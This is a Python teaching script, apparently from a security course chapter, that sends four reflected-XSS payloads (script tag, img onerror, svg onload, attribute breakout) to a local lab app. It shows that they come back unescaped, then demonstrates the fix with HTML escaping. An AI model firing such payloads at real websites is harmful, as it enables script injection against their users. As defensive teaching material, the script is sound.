"""
02_xss_payload_demo.py -- Reflected XSS Payload Demo (Ch.26: XSS, CSRF, SSRF)
=================================================================================

LEGAL / ETHICAL SCOPE
----------------------
Only test systems you own or are authorized to test. This script talks ONLY
to http://127.0.0.1:5000, the local target_app.py you run yourself. Do not
point this script (or any script derived from it) at any other host.

PREREQUISITE
-------------
Run `python target_app.py` in a separate terminal first, then run this
script in a second terminal:
    python 02_xss_payload_demo.py

WHAT THIS DEMONSTRATES
------------------------
Sends a handful of classic reflected-XSS payloads to the vulnerable
/search?q= endpoint and prints the raw, unescaped HTML the server sends
back. Because target_app.py interpolates `q` directly into the HTML with no
encoding, each payload appears verbatim in the response -- exactly as it
would be parsed and executed by a real browser rendering that page.

We do NOT execute any JavaScript here (no browser is involved) -- we simply
prove, at the HTTP level, that the dangerous markup survives untouched into
the response body, which is the root cause of reflected XSS.
"""

import requests

TARGET = "http://127.0.0.1:5000"  # local lab target ONLY -- do not change

PAYLOADS = [
    "<script>alert('xss1')</script>",
    "<img src=x onerror=alert('xss2')>",
    "<svg onload=alert('xss3')>",
    "\"><script>document.title='xss4'</script>",
]


def send_payload(payload: str) -> None:
    print(f"[*] Sending payload: {payload!r}")
    resp = requests.get(f"{TARGET}/search", params={"q": payload})
    body = resp.text

    reflected = payload in body
    print(f"    Status:               {resp.status_code}")
    print(f"    Payload reflected as-is in HTML: {reflected}")
    if reflected:
        # Show the exact snippet of raw HTML around the reflection point.
        idx = body.find(payload)
        snippet = body[max(0, idx - 30): idx + len(payload) + 10]
        print(f"    Raw HTML snippet:     ...{snippet}...")
        print("    [!] VULNERABLE: this markup would be parsed and executed by a")
        print("        real browser rendering this page (script tags run, onerror/")
        print("        onload event handlers fire).")
    else:
        print("    [i] Payload was not reflected verbatim -- target may already be patched.")
    print()


# ----------------------------------------------------------------------------
# THE FIX: output encoding
#
# The safe version of this endpoint HTML-escapes user input before placing
# it into the response, so `<script>` becomes the literal text
# "&lt;script&gt;" and is rendered as visible text, not parsed as a tag.
# See target_app.py's commented-out search_fixed() for the server-side fix;
# here we simulate the same escaping logic locally to show the before/after.
# ----------------------------------------------------------------------------
def demonstrate_fix_locally():
    from markupsafe import escape

    print("[*] Demonstrating the FIX locally with markupsafe.escape()...")
    for payload in PAYLOADS:
        safe_version = escape(payload)
        print(f"    raw:     {payload}")
        print(f"    escaped: {safe_version}")
    print("    [+] FIXED: angle brackets and quotes are converted to HTML entities,")
    print("        so the payload renders as inert text instead of executing.")
    print()


if __name__ == "__main__":
    for p in PAYLOADS:
        send_payload(p)
    demonstrate_fix_locally()
